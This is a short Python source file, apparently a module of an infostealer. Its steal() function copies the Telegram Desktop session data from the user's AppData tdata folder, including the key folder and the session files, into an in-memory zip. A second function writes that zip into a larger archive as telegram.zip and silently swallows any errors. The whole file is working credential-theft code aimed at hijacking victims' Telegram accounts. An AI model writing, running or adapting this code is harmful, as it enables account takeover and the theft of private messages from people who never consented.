import os
import io
import glob
from zipfile import ZipFile

def steal():
	# Create "file" in RAM
	archive = io.BytesIO()

	# Get appdata folder
	appdata = os.getenv("appdata")
	# Set tdata folder location
	tdata_path = os.path.join(appdata, "Telegram Desktop\\tdata\\")
	hash_path = os.path.join(appdata, "Telegram Desktop\\tdata\\D877F783D5D3EF8?*")

	#Archivation folders
	with ZipFile(archive, "w") as zipObj:
		hash_map = glob.iglob(os.path.join(hash_path , "*"))
		for file in hash_map:
			if os.path.isfile(file):
				local_path = file[len(tdata_path):]
				zipObj.write(file, "hash_map\\"+local_path)

		#If hash file has 15 letters
		files16 = glob.iglob(os.path.join(tdata_path , "??????????*"))
		for file in files16:
			if os.path.isfile(file):
				local_path = file[len(tdata_path):]
				zipObj.write(file, "connection_hash\\"+local_path)

	# Go to begin of file
	archive.seek(0)

	return archive


def steal_archive(archive):
    try:
        with archive.open("telegram.zip", "w") as f:
            f.write(steal().read())
    except:
        pass